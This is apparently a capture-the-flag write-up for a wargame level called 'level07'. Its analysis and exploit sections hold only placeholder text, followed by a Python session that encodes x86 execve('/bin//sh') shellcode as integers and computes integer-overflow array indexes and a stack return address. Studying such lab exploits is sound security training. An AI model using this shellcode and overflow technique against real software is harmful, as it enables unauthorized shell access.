# level07

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Here everything concerning the analysis of the binary.

## Exploit

Here everything concerning the exploit description.

```python
>>> print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
j
 X�Rh//shh/bin��1�̀
>>> print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
j
 X�Rh//shh/bin��1�̀
>>> 0x6a0b5899
1779128473
>>> 0x52682f2f
1382559535
>>> 0x7368682f
1936222255
>>> (2**32 + (4 * 3)) / 4
1073741827
>>> 0x62696e89
1651076745
>>> 0xe331c9cd
3811690957
>>> (2**32 + (4 * 6)) / 4
1073741830
>>> 0x80000000
2147483648
>>> 0xffffd534
4294956340
>>> (2**32 + (4 * 114)) / 4
1073741938
>>> 0xffffd534 + 4
4294956344
>>>
```